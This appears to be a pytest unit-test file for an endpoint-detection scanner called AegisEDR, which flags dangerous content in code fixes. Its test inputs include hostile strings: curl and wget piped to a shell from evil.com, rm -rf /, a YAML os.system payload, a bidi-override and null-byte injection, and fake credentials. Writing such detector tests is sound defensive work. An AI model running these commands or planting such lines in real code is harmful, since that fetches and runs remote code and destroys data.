"""tests/unit/test_security_aegis.py — AegisEDR unit tests."""
from __future__ import annotations

import pytest
from security.aegis import AegisEDR, ThreatFinding, ThreatSeverity


def _edr(strict: bool = False) -> AegisEDR:
    return AegisEDR(run_id="run-test", hmac_secret="test-hmac-secret-32charpadded-ok!", strict_mode=strict)


class TestThreatFinding:
    def test_default_severity_high(self):
        tf = ThreatFinding(threat_type="t", pattern="p")
        assert tf.severity == ThreatSeverity.HIGH

    def test_confidence_in_bounds(self):
        tf = ThreatFinding(threat_type="t", pattern="p", confidence=0.75)
        assert 0.0 <= tf.confidence <= 1.0

    def test_critical_severity_stored(self):
        tf = ThreatFinding(threat_type="t", pattern="p", severity=ThreatSeverity.CRITICAL)
        assert tf.severity == ThreatSeverity.CRITICAL


class TestAegisEDRCleanContent:
    def test_clean_python_no_findings(self):
        edr = _edr()
        findings = edr.scan_fix_content("clean.py", "def add(a, b):\n    return a + b\n")
        threats = [f for f in findings if f.severity in (ThreatSeverity.HIGH, ThreatSeverity.CRITICAL)]
        assert threats == []

    def test_empty_content_no_findings(self):
        edr = _edr()
        assert edr.scan_fix_content("empty.py", "") == []

    def test_scan_accumulates_cycle_findings(self):
        edr = _edr()
        edr.scan_fix_content("a.py", "password = 'secret123'")
        summary = edr.cycle_summary()
        assert summary["total"] >= 1

    def test_reset_cycle_clears(self):
        edr = _edr()
        edr.scan_fix_content("a.py", "password = 'secret123'")
        edr.reset_cycle()
        assert edr.cycle_summary()["total"] == 0


class TestAegisEDRPipeToShell:
    def test_curl_pipe_bash(self):
        edr = _edr()
        findings = edr.scan_fix_content("run.py", "os.system('curl http://evil.com/x.sh | bash')")
        assert any(f.threat_type == "pipe-to-shell" for f in findings)
        assert any(f.severity == ThreatSeverity.CRITICAL for f in findings)

    def test_wget_pipe_sh(self):
        edr = _edr()
        findings = edr.scan_fix_content("run.py", "subprocess.run('wget http://x.com/s | sh', shell=True)")
        assert any(f.threat_type == "pipe-to-shell" for f in findings)


class TestAegisEDRCredentials:
    def test_hardcoded_password(self):
        edr = _edr()
        findings = edr.scan_fix_content("cfg.py", "password = 'sup3rs3cr3t!'")
        assert any(f.threat_type == "hardcoded-credential" for f in findings)
        assert any(f.severity == ThreatSeverity.CRITICAL for f in findings)

    def test_hardcoded_api_key(self):
        edr = _edr()
        findings = edr.scan_fix_content("cfg.py", "api_key = 'sk-1234567890abcdef'")
        assert any(f.threat_type == "hardcoded-credential" for f in findings)

    def test_github_pat(self):
        edr = _edr()
        token = "ghp_" + "a" * 36
        findings = edr.scan_fix_content("deploy.py", f"token = '{token}'")
        assert len(findings) > 0

    def test_aws_access_key_id(self):
        edr = _edr()
        findings = edr.scan_fix_content("s3.py", "AKIA" + "0" * 16)
        assert len(findings) > 0

    def test_rsa_private_key_header(self):
        edr = _edr()
        findings = edr.scan_fix_content("keys.py", "-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
        assert any("private-key" in f.pattern for f in findings)


class TestAegisEDRPrivilegeEscalation:
    def test_sudo(self):
        edr = _edr()
        findings = edr.scan_fix_content("install.py", "subprocess.run(['sudo', 'apt', 'install', 'x'])")
        assert any(f.threat_type == "privilege-escalation" for f in findings)

    def test_chmod_777(self):
        edr = _edr()
        findings = edr.scan_fix_content("setup.py", "os.system('chmod 777 /app')")
        assert any(f.threat_type == "privilege-escalation" for f in findings)

    def test_setuid_syscall(self):
        edr = _edr()
        findings = edr.scan_fix_content("priv.c", "setuid(0);")
        assert any(f.threat_type == "privilege-escalation" for f in findings)


class TestAegisEDRDestructiveFS:
    def test_rm_rf_root(self):
        edr = _edr()
        findings = edr.scan_fix_content("clean.sh", "os.system('rm -rf /')")
        assert any(f.threat_type == "destructive-filesystem" for f in findings)
        assert any(f.severity == ThreatSeverity.CRITICAL for f in findings)

    def test_shutil_rmtree(self):
        edr = _edr()
        findings = edr.scan_fix_content("clean.py", "shutil.rmtree('/data')")
        assert any(f.threat_type == "destructive-filesystem" for f in findings)


class TestAegisEDRInjection:
    def test_unicode_bidi_rlo(self):
        edr = _edr()
        content = "access_level = \u202eadmin"
        findings = edr.scan_fix_content("auth.py", content)
        assert len(findings) > 0

    def test_yaml_python_object(self):
        edr = _edr()
        findings = edr.scan_fix_content("loader.py", "data = '!!python/object:os.system x'")
        assert len(findings) > 0

    def test_null_byte_injection(self):
        edr = _edr()
        findings = edr.scan_fix_content("parse.py", "key = 'value\x00injected'")
        assert len(findings) > 0


class TestAegisEDRHelpers:
    def test_is_threat_present_true(self):
        edr = _edr()
        findings = edr.scan_fix_content("c.py", "password = 'hardcoded_val'")
        assert edr.is_threat_present(findings)

    def test_is_threat_present_false_on_clean(self):
        edr = _edr()
        findings = edr.scan_fix_content("c.py", "x = 1 + 2")
        assert not edr.is_threat_present(findings)

    def test_is_threat_present_low_threshold(self):
        edr = _edr()
        findings = [ThreatFinding(threat_type="t", pattern="p", severity=ThreatSeverity.LOW)]
        assert edr.is_threat_present(findings, min_severity=ThreatSeverity.LOW)
        assert not edr.is_threat_present(findings, min_severity=ThreatSeverity.HIGH)

    def test_highest_severity_critical(self):
        edr = _edr()
        findings = [
            ThreatFinding(threat_type="a", pattern="x", severity=ThreatSeverity.MEDIUM),
            ThreatFinding(threat_type="b", pattern="y", severity=ThreatSeverity.CRITICAL),
        ]
        assert edr.highest_severity(findings) == ThreatSeverity.CRITICAL

    def test_highest_severity_none_on_empty(self):
        edr = _edr()
        assert edr.highest_severity([]) is None

    def test_unicode_normalization_does_not_crash(self):
        edr = _edr()
        content = "p\u0430ssword = 'secret'"
        findings = edr.scan_fix_content("c.py", content)
        assert isinstance(findings, list)
